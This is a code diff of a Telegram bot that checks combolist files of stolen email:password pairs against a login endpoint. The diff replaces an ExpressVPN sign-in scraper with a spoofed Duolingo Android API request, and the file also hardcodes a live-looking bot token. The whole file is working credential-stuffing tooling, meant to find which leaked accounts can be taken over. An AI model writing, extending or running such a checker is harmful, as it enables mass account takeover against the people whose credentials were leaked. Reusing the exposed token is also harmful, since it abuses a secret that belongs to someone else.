@@ -1,11 +1,7 @@
 from pyrogram import Client, filters
-from bs4 import BeautifulSoup
 import requests
 import pyromod
 from pyrogram.types import Message
-import mechanize
-import os
-from user_agent import generate_user_agent
 
 # Telegram bot token (replace with your bot token)
 BOT_TOKEN = "6685119417:AAGGYkc1ztEbtILrx3VmY4i8_HgzwhqdRAI"
@@ -16,23 +12,31 @@ app = Client("hma_bot",api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)
 
 def hma_login(email, password):
     try:
-        express = mechanize.Browser()
-        express.set_handle_robots(False)
-        express.addheaders = [('User-Agent', generate_user_agent())]
-        express.open("https://www.expressvpn.com/sign-in")
-        express.select_form(nr=0)
-        express.form['email'] = email
-        express.form['password'] = password 
-        vpn = express.submit().read()
-        if "Invalid email or password." in str(vpn):
-            return False, "Invalid credentials."
-        elif "Verification" in str(vpn) or "verify" in str(vpn):
-            return False, "Verification required."
+        url = "https://android-api-cf.duolingo.com/2017-06-30/login?fields=id"
+        headers = {
+            "host": "android-api-cf.duolingo.com",
+            "user-agent": "Duodroid/5.159.4 Dalvik/2.1.0 (Linux; U; Android 15; Redmi Note 15 Pro MIUI/V12.5.2.0.QFHINXM)",
+            "accept": "application/json",
+            "x-amzn-trace-id": "User=0",
+            "content-type": "application/json",
+            "accept-encoding": "gzip"
+        }
+        payload = {
+            "distinctId": "null",
+            "identifier": email,
+            "password": password
+        }
+        payload['email'] = email
+        payload['password'] = password
+        response = requests.post(url, json=payload, headers=headers)
+        if "id" in response.text:
+            return True, "Login successful."
         else:
-            return True, "Login successful."  
+            return False, "Invalid credentials."
     except Exception as e:
         return False, f"Login Failed: {str(e)}"
 
+# Command handler to check HMA VPN accounts using a combolist file
 @app.on_message(filters.command(["hma"]))
 async def trans(client, m: Message):
         try:
@@ -40,8 +44,11 @@ async def trans(client, m: Message):
             input: Message = await app.listen(editable.chat.id)
             x = await input.download()
 
+
             path = f"./downloads/"
             editable = await m.reply_text(f"Starting Account Checking.........")
+
+            results = []
 
             with open(x, 'r') as file:
                 for line in file:
